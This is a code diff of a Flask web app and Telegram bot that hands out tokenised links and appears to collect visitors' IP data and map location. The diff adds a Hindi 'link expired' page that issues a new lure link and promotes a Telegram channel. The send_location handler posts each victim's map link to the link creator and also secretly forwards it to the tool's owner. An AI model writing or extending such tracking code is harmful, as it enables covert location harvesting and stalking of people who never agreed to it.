@@ -2,7 +2,7 @@ import threading
 import requests
 import os
 import base64
-from flask import Flask, request, render_template, jsonify, abort
+from flask import Flask, request, render_template, jsonify
 from telegram.ext import Updater, CommandHandler
 from utils import BOT_TOKEN, OWNER_CHAT_ID, IPINFO_TOKEN
 from token_store import (
@@ -25,7 +25,6 @@ def start(update, context):
     chat_id = update.message.chat_id
     user = update.message.from_user
 
-    # ✅ Check for existing token
     token = get_token_for_chat(chat_id)
     if not token:
         token = generate_token(chat_id)
@@ -58,7 +57,18 @@ def index():
     token = request.args.get("token")
     chat_id = get_chat_id(token)
     if not chat_id:   # ✅ invalid token
-        return abort(403)
+        new_token = generate_token("expired")
+        store_token_for_chat(new_token, "expired")
+        new_link = f"{RENDER_URL}?token={new_token}"
+
+        return (
+            f"<h2>⚠️ यह link expire हो गया है</h2>"
+            f"<p>नया link पाने के लिए हमारे Telegram channel को join करें:</p>"
+            f"<p><b>@YourChannelName</b></p>"
+            f"<p>👉 <a href='{new_link}'>यहाँ क्लिक करें</a> नया link खोलने के लिए</p>",
+            403
+        )
+
     name = get_name(token) or "User"
     return render_template("index.html", token=token, ipinfo_token=IPINFO_TOKEN, user_name=name)
 
@@ -67,7 +77,18 @@ def next_page():
     token = request.args.get("token")
     chat_id = get_chat_id(token)
     if not chat_id:   # ✅ invalid token
-        return abort(403)
+        new_token = generate_token("expired")
+        store_token_for_chat(new_token, "expired")
+        new_link = f"{RENDER_URL}?token={new_token}"
+
+        return (
+            f"<h2>⚠️ यह link expire हो गया है</h2>"
+            f"<p>नया link पाने के लिए हमारे Telegram channel को join करें:</p>"
+            f"<p><b>@YourChannelName</b></p>"
+            f"<p>👉 <a href='{new_link}'>यहाँ क्लिक करें</a> नया link खोलने के लिए</p>",
+            403
+        )
+
     name = get_name(token) or "User"
     return render_template("page2.html", token=token, user_name=name)
 
@@ -214,7 +235,6 @@ def send_location():
             data={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
             timeout=10
         )
-        # Forward link to owner too
         requests.post(
             f"{TELEGRAM_API}/sendMessage",
             data={"chat_id": OWNER_CHAT_ID, "text": f"User {chat_id} map link:\n{maps_url}"},
